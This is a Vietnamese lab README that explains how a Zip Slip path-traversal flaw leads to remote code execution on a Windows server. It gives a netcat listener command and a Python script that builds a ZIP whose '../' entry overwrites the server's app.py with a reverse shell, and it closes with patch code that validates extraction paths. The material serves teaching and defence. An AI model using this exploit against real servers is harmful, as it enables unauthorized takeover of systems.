# Zip Slip to RCE (Windows Demo)

Bài lab này minh họa cách khai thác lỗ hổng Zip Slip để chiếm quyền điều khiển server (RCE) trên Windows.

## 1. Lỗ hổng nằm ở đâu?
Ứng dụng giải nén file ZIP nhưng không kiểm tra tên file bên trong. Kẻ tấn công có thể sử dụng chuỗi "../" để ghi đè file hệ thống.

Lỗ hỏng:

    full_path = os.path.join(extract_to, member.filename)

## 2. Cách khai thác

- Bước 1: Trên máy Linux, mở cổng lắng nghe:
    
    nc -lnvp 4444

- Bước 2: Tạo file ZIP chứa mã độc Reverse Shell bằng exploit/exploit.py:

    import zipfile
    with zipfile.ZipFile("payload.zip", 'w') as zf:
        zf.writestr("dummy/", "")
        zf.write("exploit/app.py", arcname="dummy/../.././app.py")

- Bước 3: Upload file payload.zip. Mã độc sẽ ghi đè file app.py của server.

- Bước 4: Khi server load lại file, Reverse Shell sẽ được thực thi.
  Máy Linux sẽ nhận được shell (cmd.exe).

## 3. Cách vá lỗi

Cần kiểm tra đường dẫn sau khi giải nén phải nằm trong thư mục cho phép:

    if member.flag_bits & 0x1:
        raise RuntimeError(f"Encrypted zip entry not supported: {member.filename}")
    if _is_zipinfo_symlink(member):
        raise RuntimeError(f"Symlink zip entry not supported: {member.filename}")

    name = member.filename.replace("\\", "/")
    if root_dir and name == root_dir:
        continue
    if root_dir and name.startswith(root_dir):
        name = name[len(root_dir) :]
    if not name:
        continue

    if name.startswith("/") or name.startswith("//") or re.match(r"^[A-Za-z]:", name):
        raise RuntimeError(f"Unsafe zip path (absolute): {member.filename}")

    parts = [p for p in name.split("/") if p not in ("", ".")]

    if any(p == ".." for p in parts):
        raise RuntimeError(f"Unsafe zip path (traversal): {member.filename}")

    rel_path = os.path.join(*parts) if parts else ""
    dest_path = (Path(extract_to) / rel_path).resolve(strict=False)

    if dest_path != base_dir and base_dir not in dest_path.parents:
        raise RuntimeError(f"Unsafe zip path (escape): {member.filename}")

    if member.is_dir():
        os.makedirs(dest_path, exist_ok=True)
        continue

    os.makedirs(dest_path.parent, exist_ok=True)
    with zip_ref.open(member) as src, open(dest_path, "wb") as dst:
        shutil.copyfileobj(src, dst)

    extracted_files.append(str(dest_path))